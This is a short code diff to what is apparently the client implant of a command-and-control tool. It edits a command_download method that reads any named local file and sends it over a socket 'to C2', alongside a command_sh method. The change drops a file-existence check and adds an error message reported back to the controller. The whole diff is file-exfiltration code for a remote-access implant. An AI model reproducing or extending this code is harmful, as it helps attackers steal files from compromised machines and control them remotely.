@@ -79,13 +79,12 @@ class ClientCommands(Commands):
     def command_download(self, filename):
         """ Send local file to C2 """
         LOGGER.debug("Local filename to send : %s", filename)
-        if not os.path.exists(filename):
-            LOGGER.debug("%s does not exists", filename)
         try:
             with open(filename, 'rb') as file:  # type: io.BufferedReader
                 self.sock.send_file(file)
         except OSError as err:
             LOGGER.error("Error trying to download %s : %s, %s", filename, type(err), err)
+            self.sock.send_file(io.BytesIO(f"Cannot download file : {err}".encode()))
 
     def command_sh(self, *cmd):
         """ Send local file to C2 """
